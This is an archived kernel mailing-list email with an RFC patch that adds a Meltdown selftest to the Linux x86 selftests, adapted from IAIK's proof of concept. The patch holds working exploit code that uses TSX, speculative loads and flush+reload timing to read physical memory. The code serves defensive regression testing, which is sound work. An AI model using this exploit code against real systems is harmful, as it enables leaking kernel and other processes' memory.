Return-Path: <linux-kselftest-owner@vger.kernel.org>
X-Original-To: lists+linux-kselftest@lfdr.de
Delivered-To: lists+linux-kselftest@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id 427D161E18C
	for <lists+linux-kselftest@lfdr.de>; Sun,  6 Nov 2022 11:20:02 +0100 (CET)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S229698AbiKFKUA (ORCPT <rfc822;lists+linux-kselftest@lfdr.de>);
        Sun, 6 Nov 2022 05:20:00 -0500
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:33814 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S229589AbiKFKT7 (ORCPT
        <rfc822;linux-kselftest@vger.kernel.org>);
        Sun, 6 Nov 2022 05:19:59 -0500
Received: from mga01.intel.com (mga01.intel.com [192.55.52.88])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id BEF226173;
        Sun,  6 Nov 2022 02:19:57 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
  t=1667729997; x=1699265997;
  h=date:from:to:cc:subject:message-id:references:
   in-reply-to:mime-version;
  bh=owAPjpYxH+lVxTmgqnx/l0V07UvXBpSxcycsJnbWzS4=;
  b=gZpIiPKN3vnUjhnfSjU5C4RTF1Oqod9AuCtnsGTLXNjhepSXRVbPA74D
   eL9ML3kd0TN3fK83OS1/NvRWjpUGKdTXv5xeSX0zjbgp128CA3DT2d4QZ
   bYfJha+Wq+6E2If9P7FsLLr2yCK1ikjf3Vzm/ov5pBZXRrIjtKnAdcLBB
   wFa7oVsWMklgoEoC7bT727RPVtmJUzxOIsldvrOxurRzDHcd2g053fLtw
   B03UJGdSCtfdvZmbRmH1p9czyuD0/fzgaZQP1hK0Fk0Kq5gwHf/Hcc7YC
   ZeHaoavtRGpNLYmGtIeU+uCGcVHhtaBDtwXWMCMtn1Pg2WGVh6lnRE1oH
   Q==;
X-IronPort-AV: E=McAfee;i="6500,9779,10522"; a="336959001"
X-IronPort-AV: E=Sophos;i="5.96,142,1665471600"; 
   d="scan'208";a="336959001"
Received: from fmsmga007.fm.intel.com ([10.253.24.52])
  by fmsmga101.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 06 Nov 2022 02:19:57 -0800
X-ExtLoop1: 1
X-IronPort-AV: E=McAfee;i="6500,9779,10522"; a="638061712"
X-IronPort-AV: E=Sophos;i="5.96,142,1665471600"; 
   d="scan'208";a="638061712"
Received: from fmsmsx602.amr.corp.intel.com ([10.18.126.82])
  by fmsmga007.fm.intel.com with ESMTP; 06 Nov 2022 02:19:57 -0800
Received: from fmsmsx611.amr.corp.intel.com (10.18.126.91) by
 fmsmsx602.amr.corp.intel.com (10.18.126.82) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
 15.1.2375.31; Sun, 6 Nov 2022 02:19:56 -0800
Received: from fmsmsx602.amr.corp.intel.com (10.18.126.82) by
 fmsmsx611.amr.corp.intel.com (10.18.126.91) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
 15.1.2375.31; Sun, 6 Nov 2022 02:19:56 -0800
Received: from fmsedg602.ED.cps.intel.com (10.1.192.136) by
 fmsmsx602.amr.corp.intel.com (10.18.126.82) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
 15.1.2375.31 via Frontend Transport; Sun, 6 Nov 2022 02:19:56 -0800
Received: from NAM10-BN7-obe.outbound.protection.outlook.com (104.47.70.100)
 by edgegateway.intel.com (192.55.55.71) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 15.1.2375.31; Sun, 6 Nov 2022 02:19:56 -0800
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=jd1tWfIjbEJ1FyialYSvdn+1oRxIYLMKRNP55gBK9g86jVhXjAzYHCTvwNzAfooPVqCDpQCQuDkrbCPT8IQyCxYxLHjmyvJFX+aFF4nVK8mhaHET2FYtovQj8wn9B/ynNGIjElctQLvX7J+RMd0jOv77vAWF0c5j6Rl9VhiSAyl3OQwTirwE0YfR9hNmSGAON1SLMkVSq8O3tsxwKl6ZL0IuD/Ea85BwzJYVBRVVBAGjbvnu0G3S8qIEeQInIE5ZPfZT2BGL8/01ZhwcjKHOV3xH6X/ilPYBpuZ3D+JBV+apHA0LYJTzyAvCCKoXJvnxfC9gBiYIQ/ZAMBCEJbpzKw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=76Xl+aqkwNgpjA+ol2FhAqzDvLKD6zziFX1/90stXAA=;
 b=b6WUW7LLiz4b2bmUJR9yUnhy0clCIGFQ/8O5NbjQtqIuoVbbem4D30xGlJZPgU6hVpLDWv05ogCnV19hqbmkmfNkjdrYtucSQZIlutClPY9KoAfFRnN9wi0ooRbVAMVlA6QMNmIh2M5hpr77HvoaLbrrqZVNNzbIWL0DHIoa1kfgjHHwl4asWB+Zxp2AWqII3VmDYNQ55w89LNV+szUffJpLs4nNYv83PqIAZXvA7+u4xLXKJlJ073CV3Iau74+Uz2GfXqilLBW1kvRm5SOelX7fnm4mOsh7ptmXPqXac8DuCuvn8cjXk5HZGoKPHRxExJafrS6XJW3PIxLbGfR5ew==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=intel.com; dmarc=pass action=none header.from=intel.com;
 dkim=pass header.d=intel.com; arc=none
Authentication-Results: dkim=none (message not signed)
 header.d=none;dmarc=none action=none header.from=intel.com;
Received: from BYAPR11MB3062.namprd11.prod.outlook.com (2603:10b6:a03:92::18)
 by SJ0PR11MB5813.namprd11.prod.outlook.com (2603:10b6:a03:422::19) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.5791.22; Sun, 6 Nov
 2022 10:19:48 +0000
Received: from BYAPR11MB3062.namprd11.prod.outlook.com
 ([fe80::bb20:85b6:d9ef:423e]) by BYAPR11MB3062.namprd11.prod.outlook.com
 ([fe80::bb20:85b6:d9ef:423e%6]) with mapi id 15.20.5791.025; Sun, 6 Nov 2022
 10:19:48 +0000
Date:   Sun, 6 Nov 2022 18:19:39 +0800
From:   Aaron Lu <aaron.lu@intel.com>
To:     Dave Hansen <dave.hansen@intel.com>
CC:     Tony Luck <tony.luck@intel.com>,
        "Yin, Fengwei" <fengwei.yin@intel.com>,
        "Kirill A. Shutemov" <kirill.shutemov@linux.intel.com>,
        "Huang, Ying" <ying.huang@intel.com>,
        <linux-kselftest@vger.kernel.org>, <linux-kernel@vger.kernel.org>
Subject: [RFC PATCH v2] selftest/x86/meltdown: Add a selftest for meltdown
Message-ID: <Y2eKO48Tv+UD0IpV@ziqianlu-desk1>
References: <Y1kwa0ZLI9xbEaHx@ziqianlu-desk1>
Content-Type: text/plain; charset="us-ascii"
Content-Disposition: inline
In-Reply-To: <Y1kwa0ZLI9xbEaHx@ziqianlu-desk1>
X-ClientProxiedBy: SG2P153CA0017.APCP153.PROD.OUTLOOK.COM (2603:1096::27) To
 BYAPR11MB3062.namprd11.prod.outlook.com (2603:10b6:a03:92::18)
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: BYAPR11MB3062:EE_|SJ0PR11MB5813:EE_
X-MS-Office365-Filtering-Correlation-Id: 0d30d46e-f7d1-4c7d-a541-08dabfe06edf
X-LD-Processed: 46c98d88-e344-4ed4-8496-4ed7712e255d,ExtAddr
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: geuDZDYUwdscbPggjWIUr0+JGU8IAqqAhNJQ0wJyusqw1KgW1o2ana66PISlQWZN+/VdlEK/Tph48LARWp12fnI/5nLr7fIjy3NV58USzbbTuw78t6XFFWGjJE3mB+B6Z5Jm2fxVLzy7uZ9ocUQ23v+AUohaPG9P6yfG66Gq4zqla48B/Y6YHuF+3ITCjxMI8Uw27BlJ4cAfWjhSrUZWxRLdXOYiKXp6ojJ9dMoIaZiDJh/mpuIihQ3N+KwWgzqEcRMh0bNdWJpLvHulg1/jGKkpcrftpYGwbRad/eJH/4YVw8QAx8YStBC0Pu15ocyo8U4M4swBN7SGq03kxaYl2KpbXLDeDsUhlLaoYEdVky3AQ75RJ/9hrMPX7xi58nPZNLZzU6v+1H69YfkPzbyMeHWB5WniTRf6OZxz+pBbmKinVuRPnTTINtPJeLqV8amVdVCnBXbeh/ZX+LDlaXnqK3/MZ0xO0Ikq3OIZV+9UIHTobljXKT1VKJcniiIRknfK+r3AGlnmSe/dR43cJlLO0CTBZx8X62+yPV9wwJqr08ITWRbAKbJD6OXqos73q6aLUdUV8cATVL8duXrnlxtKVAgunScnKiBKBtm71PnvKOhIeqQ3/TlKFRoxcAQpuLIm63K30cXHsj6loREw8+qrhZRc0f6++XKFgm16+hz4ko15uuQpLTVP4viov9M/wo/hebeRhSK34fWI+AVw2fqXY5pQAc5M2wym59wfaEWWnLKIbw9YKR+eF4SvATBAC0wmLZeQ9+wN+qXfW4NmmWkZoA==
X-Forefront-Antispam-Report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:BYAPR11MB3062.namprd11.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230022)(7916004)(136003)(396003)(39860400002)(376002)(346002)(366004)(451199015)(4326008)(316002)(8676002)(30864003)(44832011)(9686003)(6636002)(6506007)(6862004)(66476007)(8936002)(5660300002)(66946007)(86362001)(66556008)(54906003)(6512007)(41300700001)(26005)(966005)(186003)(33716001)(83380400001)(6666004)(38100700002)(478600001)(6486002)(66899015)(82960400001)(2906002)(67856001);DIR:OUT;SFP:1102;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0: =?us-ascii?Q?45q6j0H3d/sefEB/9MDq2jDaEhVFmS3B/XvlaYdpGv523KYntvUgJhvfFr1c?=
 =?us-ascii?Q?q5cyaFM9dyhTptbtjJZqUn4/ZHnX2M0c0RujEIRip8UgXrJp1KIcxXxPYNSm?=
 =?us-ascii?Q?6UZcBDF3xXAwJGzAqKJjolApW49KmDu3DZIprVLaOTpE4ptso5ivUvH7Q5od?=
 =?us-ascii?Q?SBpOZ580dtRw/Thw3lnrj0x+BnLKhvkrkjoBi8WrpeO06e+NNwXUqw+aoo4o?=
 =?us-ascii?Q?I949CjLZvaZ3pAadf5Qf2P7jnPOHxjCaAp5qMk52D7u3TKQyh0GOx6vwa3+N?=
 =?us-ascii?Q?i77ISKZ0A7jAqGomozgNGE3zAaivAwq9PjxGxaKCuD3hocuat/jZ3eaE4qGj?=
 =?us-ascii?Q?bDuxn+SituyAttXLKsxL80WQvaA78ZEjgysgcBQnMdcZZsoPtKjvZVBefuYp?=
 =?us-ascii?Q?1aJOe49l+hT8IEujV1DHMJGuAaVdKGI74s+wAlTrMjvxfD2bxbmOOZ7twvaR?=
 =?us-ascii?Q?bcby/3tU5DXlBYJt83B8TARD0pT6RPRsQGuDYtfOEVzLVpwgqWw4SEbdWvJ7?=
 =?us-ascii?Q?Cj6kpEyuvJfgiDoTThC0PCbultkkQzlY7dKaXCQxEw3MHPOwLdV0CCSJLlrX?=
 =?us-ascii?Q?yniyxL8FIz4BYLpV5rDnKCtkKhVFCYXsJrNig3OtFxkHU6FSMUpBWCGrHeM+?=
 =?us-ascii?Q?k/2ejhFvkdTKlw0zhxbQ6RS2YIUvb1S+V7nxSM3AuAwWWRjVn4j2jfNs4dJj?=
 =?us-ascii?Q?pP+NjeEW6x0cRPGn8mvigJFKQhbprcYgQgtuF25fxRnG4US+5GBPJ5jYmbiY?=
 =?us-ascii?Q?HhN+26bOa0puasIa1hV9sekMzw2m30aJp3eUoDMfUTYSneoTaqg9JHIucst4?=
 =?us-ascii?Q?2l8EL2Yf0IWS3jl4t9/ZsxO/5+xOR0tRCLH8avP8uvgKjPONR8GD51HrdKVY?=
 =?us-ascii?Q?OYp+yRT/CBzZWBqfO+lHgRzbGpeh6xNyD2gx5Zx6AMvUNjb8U5AX8+7LElMP?=
 =?us-ascii?Q?IA+Z5tXymeRN0NvMbQscMigE7vpdlZJkaw0xatPvBpL0hjJExICaFGRvNEfo?=
 =?us-ascii?Q?VBz6vrGumTErF36eo2jyuVLexCsj/HXGImY6yu4dHhzYioRc8hHVFRLoTYle?=
 =?us-ascii?Q?3n82CiYrtlw/hC/2YqZ1s3H2Mp8OFQyVi2SL6X9XhEmtk+U5OeqQXOHJ35QO?=
 =?us-ascii?Q?84lFizf/hVkMeqNKn0/6U1gRVtZn33Mjz538tyW4FSMZzLcHC9juWiS4lgWb?=
 =?us-ascii?Q?x2p2ogH7ASoT7qU1is/evfvSkn4RQ43elSBUoN5eGCDhjhwURJx1aKSUBDxi?=
 =?us-ascii?Q?kICSqEDzVHIMMSwYZJ5U0AErdwlAZ+8OVcbBPn8WNoIwndf3w2h7IoN36BRT?=
 =?us-ascii?Q?qisUbHh8aHIXkWxechX6TLjtVazjSkhz6fx0RXo3qu7odCsF6nVEkCS7q8q8?=
 =?us-ascii?Q?unFlskCgSSmXWrz658uz9SNSZpcov12jyXkIVna879DSb2FFWN2ei1QCDaE7?=
 =?us-ascii?Q?bCvJrS6/c/x4YzDHKcAHg3AwhWNcIxU5qL+9aOV069ROLOujKFe/Rwcvw6Ya?=
 =?us-ascii?Q?bGf7nTPNcslSRuSrs4Pq/aFuoIqVWiDjK9xNBSXcN3JMM2hy/48V3N4P9LqQ?=
 =?us-ascii?Q?P60sejLhr7+rvmEbzzdtGEZZtkd/t5DLe9hB5Fwa?=
X-MS-Exchange-CrossTenant-Network-Message-Id: 0d30d46e-f7d1-4c7d-a541-08dabfe06edf
X-MS-Exchange-CrossTenant-AuthSource: BYAPR11MB3062.namprd11.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 06 Nov 2022 10:19:48.2420
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 46c98d88-e344-4ed4-8496-4ed7712e255d
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: eFiLN/fSfe16aK60udUaESBUsci3H0zrh/i/ne+Y1yl3YxDHT/KgX77Op08V1ha9clnhmMbuPGrjrOjpz5YYTg==
X-MS-Exchange-Transport-CrossTenantHeadersStamped: SJ0PR11MB5813
X-OriginatorOrg: intel.com
X-Spam-Status: No, score=-7.1 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,RCVD_IN_DNSWL_HI,
        RCVD_IN_MSPIKE_H3,RCVD_IN_MSPIKE_WL,SPF_HELO_NONE,SPF_NONE
        autolearn=ham autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-kselftest.vger.kernel.org>
X-Mailing-List: linux-kselftest@vger.kernel.org

To capture potential programming errors like mistakenly setting Global
bit on kernel page table entries, a selftest for meltdown is added.

This selftest is based on https://github.com/IAIK/meltdown. What this
test does is to firstly set a predefined string at a random user address
and then with pagemap, get the physical address of this string. Finally,
try to fetch the data using kernel's directmap address for this physical
address to see if user space can use kernel's page table.

Per my tests, this test works well on CPUs that have TSX support. For
this reason, this selftest only works on CPUs that supports TSX.

This test requires the knowledge of direct map base. IAIK used the
following two methods to get direct map base:
1 through a kernel module to show phys_to_virt(0);
2 by exploiting the same HW vulnerability to guess the base.
Method 1 makes running this selftest complex while method 2 is not
reliable and I do not want to use a possibly wrong value to run this
test. Suggestions are welcome.

Tested on both x86_64 and i386_pae VMs on a host with i7-7700K cpu,
success rate is about 50% when nopti kernel cmdline is used.

Signed-off-by: Aaron Lu <aaron.lu@intel.com>
---
v2:
- Added [SKIP], [INFO] prefix to some prints;
- Do not run 32bits test on 64bits host since it doesn't make sense to
  do that;
- Minor comment update.

 tools/testing/selftests/x86/Makefile   |   2 +-
 tools/testing/selftests/x86/meltdown.c | 418 +++++++++++++++++++++++++
 2 files changed, 419 insertions(+), 1 deletion(-)
 create mode 100644 tools/testing/selftests/x86/meltdown.c

diff --git a/tools/testing/selftests/x86/Makefile b/tools/testing/selftests/x86/Makefile
index 0388c4d60af0..36f99c360a56 100644
--- a/tools/testing/selftests/x86/Makefile
+++ b/tools/testing/selftests/x86/Makefile
@@ -13,7 +13,7 @@ CAN_BUILD_WITH_NOPIE := $(shell ./check_cc.sh "$(CC)" trivial_program.c -no-pie)
 TARGETS_C_BOTHBITS := single_step_syscall sysret_ss_attrs syscall_nt test_mremap_vdso \
 			check_initial_reg_state sigreturn iopl ioperm \
 			test_vsyscall mov_ss_trap \
-			syscall_arg_fault fsgsbase_restore sigaltstack
+			syscall_arg_fault fsgsbase_restore sigaltstack meltdown
 TARGETS_C_32BIT_ONLY := entry_from_vm86 test_syscall_vdso unwind_vdso \
 			test_FCMOV test_FCOMI test_FISTTP \
 			vdso_restorer
diff --git a/tools/testing/selftests/x86/meltdown.c b/tools/testing/selftests/x86/meltdown.c
new file mode 100644
index 000000000000..8c0c1db49096
--- /dev/null
+++ b/tools/testing/selftests/x86/meltdown.c
@@ -0,0 +1,418 @@
+// SPDX-License-Identifier: GPL-2.0-only
+/*
+ * This selftest is based on code from https://github.com/IAIK/meltdown
+ * and can be used to check if user space can read data through kernel
+ * page table entries.
+ *
+ * Note for i386 test: due to kernel prefer to use high memory for user
+ * programs, it is necessary to restrict the available memory under that
+ * of low memory size(around ~896MiB) so that the memory hosting "string"
+ * in main() is directly mapped.
+ *
+ * Note for both x86_64 and i386 test: the hardware race window can not be
+ * exploited 100% each time so a single run of the test on a vulnerable system
+ * may not FAIL. My tests on a i7-7700K cpu have a success rate about 50%.
+ *
+ * The original copyright and license information are shown below:
+ *
+ * Copyright (c) 2018 meltdown
+ *
+ * This software is provided 'as-is', without any express or implied
+ * warranty. In no event will the authors be held liable for any damages
+ * arising from the use of this software.
+ *
+ * Permission is granted to anyone to use this software for any purpose,
+ * including commercial applications, and to alter it and redistribute it
+ * freely, subject to the following restrictions:
+ *
+ *    1. The origin of this software must not be misrepresented; you must not
+ *    claim that you wrote the original software. If you use this software
+ *    in a product, an acknowledgment in the product documentation would be
+ *    appreciated but is not required.
+ *
+ *    2. Altered source versions must be plainly marked as such, and must not be
+ *    misrepresented as being the original software.
+ *
+ *    3. This notice may not be removed or altered from any source
+ *    distribution.
+ */
+
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <string.h>
+#include <cpuid.h>
+#include <errno.h>
+#include <err.h>
+#include <sys/mman.h>
+#include <sys/utsname.h>
+
+#define PAGE_SHIFT	12
+#define PAGE_SIZE	0x1000
+#define PUD_SHIFT	30
+#define PUD_SIZE	(1UL << PUD_SHIFT)
+#define PUD_MASK	(~(PUD_SIZE - 1))
+
+#define _XBEGIN_STARTED	(~0u)
+
+/* configurables */
+#define NR_MEASUREMENTS	3
+#define NR_TRIES	10000
+
+size_t cache_miss_threshold;
+unsigned long directmap_base;
+
+static int get_directmap_base(void)
+{
+	char *buf;
+	FILE *fp;
+	size_t n;
+	int ret;
+
+	fp = fopen("/sys/kernel/debug/page_tables/kernel", "r");
+	if (!fp)
+		return -1;
+
+	buf = NULL;
+	ret = -1;
+	while (getline(&buf, &n, fp) != -1) {
+		if (!strstr(buf, "Kernel Mapping"))
+			continue;
+
+		if (getline(&buf, &n, fp) != -1 &&
+		    sscanf(buf, "0x%lx", &directmap_base) == 1) {
+			printf("[INFO]\tdirectmap_base=0x%lx/0x%lx\n", directmap_base, directmap_base & PUD_MASK);
+			directmap_base &= PUD_MASK;
+			ret = 0;
+			break;
+		}
+	}
+
+	fclose(fp);
+	free(buf);
+	return ret;
+}
+
+/*
+ * Requires root due to pagemap.
+ */
+static int virt_to_phys(unsigned long virt, unsigned long *phys)
+{
+	unsigned long pfn;
+	uint64_t val;
+	int fd, ret;
+
+	fd = open("/proc/self/pagemap", O_RDONLY);
+	if (fd == -1) {
+		printf("[INFO]\tFailed to open pagemap\n");
+		return -1;
+	}
+
+	ret = pread(fd, &val, sizeof(val), (virt >> PAGE_SHIFT) * sizeof(uint64_t));
+	if (ret == -1) {
+		printf("[INFO]\tFailed to read pagemap\n");
+		goto out;
+	}
+
+	if (!(val & (1ULL << 63))) {
+		printf("[INFO]\tPage not present according to pagemap\n");
+		ret = -1;
+		goto out;
+	}
+
+	pfn = val & ((1ULL << 55) - 1);
+	if (pfn == 0) {
+		printf("[INFO]\tNeed CAP_SYS_ADMIN to show pfn\n");
+		ret = -1;
+		goto out;
+	}
+
+	ret = 0;
+	*phys = (pfn << PAGE_SHIFT) | (virt & (PAGE_SIZE - 1));
+
+out:
+	close(fd);
+	return ret;
+}
+
+static uint64_t rdtsc()
+{
+	uint64_t a = 0, d = 0;
+
+	asm volatile("mfence");
+#ifdef __x86_64__
+	asm volatile("rdtsc" : "=a"(a), "=d"(d));
+#else
+	asm volatile("rdtsc" : "=A"(a));
+#endif
+	a = (d << 32) | a;
+	asm volatile("mfence");
+
+	return a;
+}
+
+#ifdef __x86_64__
+static void maccess(void *p)
+{
+	asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
+}
+
+static void flush(void *p)
+{
+	asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
+}
+
+#define MELTDOWN					\
+	asm volatile("1:\n"				\
+		     "movzx (%%rcx), %%rax\n"		\
+		     "shl $12, %%rax\n"			\
+		     "jz 1b\n"				\
+		     "movq (%%rbx,%%rax,1), %%rbx\n"	\
+		     :					\
+		     : "c"(virt), "b"(array)		\
+		     : "rax");
+#else
+static void maccess(void *p)
+{
+	asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");
+}
+
+static void flush(void *p)
+{
+	asm volatile("clflush 0(%0)\n" : : "c"(p) : "eax");
+}
+
+#define MELTDOWN					\
+	asm volatile("1:\n"				\
+		     "movzx (%%ecx), %%eax\n"		\
+		     "shl $12, %%eax\n"			\
+		     "jz 1b\n"				\
+		     "mov (%%ebx,%%eax,1), %%ebx\n"	\
+		     :					\
+		     : "c"(virt), "b"(array)		\
+		     : "eax");
+#endif
+
+static void detect_flush_reload_threshold()
+{
+	size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
+	size_t dummy[16];
+	size_t *ptr = dummy + 8;
+	uint64_t start = 0, end = 0;
+
+	maccess(ptr);
+	for (i = 0; i < count; i++) {
+		start = rdtsc();
+		maccess(ptr);
+		end = rdtsc();
+		reload_time += (end - start);
+	}
+
+	for (i = 0; i < count; i++) {
+		start = rdtsc();
+		maccess(ptr);
+		end = rdtsc();
+		flush(ptr);
+		flush_reload_time += (end - start);
+	}
+
+	reload_time /= count;
+	flush_reload_time /= count;
+
+	printf("[INFO]\tFlush+Reload: %zd cycles, Reload only: %zd cycles\n",
+			flush_reload_time, reload_time);
+	cache_miss_threshold = (flush_reload_time + reload_time * 2) / 3;
+	printf("[INFO]\tFlush+Reload threshold: %zd cycles\n", cache_miss_threshold);
+}
+
+static int flush_reload(void *ptr)
+{
+	uint64_t start, end;
+
+	start = rdtsc();
+	maccess(ptr);
+	end = rdtsc();
+
+	flush(ptr);
+
+	if (end - start < cache_miss_threshold)
+		return 1;
+
+	return 0;
+}
+
+static int check_tsx()
+{
+	if (__get_cpuid_max(0, NULL) >= 7) {
+		unsigned a, b, c, d;
+		__cpuid_count(7, 0, a, b, c, d);
+		return (b & (1 << 11)) ? 1 : 0;
+	} else
+		return 0;
+}
+
+static unsigned int xbegin(void)
+{
+	unsigned int status;
+
+	asm volatile("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) : "memory");
+	asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00" : "=a"(status) : "a"(-1UL) : "memory");
+
+	return status;
+}
+
+static void xend(void)
+{
+	asm volatile("xend" ::: "memory");
+	asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
+}
+
+static int __read_phys_memory_tsx(unsigned long phys, char *array)
+{
+	unsigned long virt;
+	int i, retries;
+
+	virt = phys + directmap_base;
+	for (retries = 0; retries < NR_TRIES; retries++) {
+		if (xbegin() == _XBEGIN_STARTED) {
+			MELTDOWN;
+			xend();
+		}
+
+		for (i = 1; i < 256; i++) {
+			if (flush_reload(array + i * PAGE_SIZE))
+				return i;
+		}
+	}
+
+	return 0;
+}
+
+/*
+ * Read physical memory by exploiting HW bugs.
+ * One byte a time.
+ */
+static int read_phys_memory(unsigned long phys, char *array)
+{
+	char res_stat[256];
+	int i, r, max_v, max_i;
+
+	memset(res_stat, 0, sizeof(res_stat));
+
+	for (i = 0; i < NR_MEASUREMENTS; i++) {
+		for (i = 0; i < 256; i++)
+			flush(array + i * PAGE_SIZE);
+
+		r = __read_phys_memory_tsx(phys, array);
+		if (r != 0)
+			res_stat[r]++;
+	}
+
+	max_v = 0;
+	for (i = 1; i < 256; i++) {
+		if (res_stat[i] > max_v) {
+			max_i = i;
+			max_v = res_stat[i];
+		}
+	}
+
+	if (max_v == 0)
+		return 0;
+
+	return max_i;
+}
+
+#ifdef __i386
+/* 32 bits version is only meant to run on a PAE kernel */
+static int arch_test_mismatch(void)
+{
+	struct utsname buf;
+
+	if (uname(&buf) == -1) {
+		printf("[SKIP]\tCan't decide architecture\n");
+		return 1;
+	}
+
+	if (!strncmp(buf.machine, "x86_64", 6)) {
+		printf("[SKIP]\tNo need to run 32bits test on 64bits host\n");
+		return 1;
+	}
+
+	return 0;
+}
+#else
+static int arch_test_mismatch(void)
+{
+	return 0;
+}
+#endif
+
+static int test_meltdown(void)
+{
+	char string[] = "test string";
+	char *array, *result;
+	unsigned long phys;
+	int i, len, ret;
+
+	if (arch_test_mismatch())
+		return 0;
+
+	if (get_directmap_base() == -1) {
+		printf("[SKIP]\tFailed to get directmap base. Make sure you are root and kernel has CONFIG_PTDUMP_DEBUGFS\n");
+		return 0;
+	}
+
+	detect_flush_reload_threshold();
+
+	if (!check_tsx()) {
+		printf("[SKIP]\tNo TSX support\n");
+		return 0;
+	}
+
+	if (virt_to_phys((unsigned long)string, &phys) == -1) {
+		printf("[FAIL]\tFailed to convert virtual address to physical address\n");
+		return -1;
+	}
+
+	len = strlen(string);
+	result = malloc(len + 1);
+	if (!result) {
+		printf("[FAIL]\tNot enough memory for malloc\n");
+		return -1;
+	}
+	memset(result, 0, len + 1);
+
+	array = mmap(NULL, 256 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	if (!array) {
+		printf("[FAIL]\tNot enough memory for mmap\n");
+		free(result);
+		return -1;
+	}
+	memset(array, 0, 256 * PAGE_SIZE);
+
+	for (i = 0; i < len; i++, phys++) {
+		result[i] = read_phys_memory(phys, array);
+		if (result[i] == 0)
+			break;
+	}
+
+	ret = !strncmp(string, result, len);
+	if (ret)
+		printf("[FAIL]\tSystem is vulnerable to meltdown.\n");
+	else
+		printf("[OK]\tSystem might not be vulnerable to meltdown.\n");
+
+	munmap(array, 256 * PAGE_SIZE);
+	free(result);
+
+	return ret;
+}
+
+int main(void)
+{
+	printf("[RUN]\tTest if system is vulnerable to meltdown\n");
+
+	return test_meltdown();
+}
-- 
2.38.1

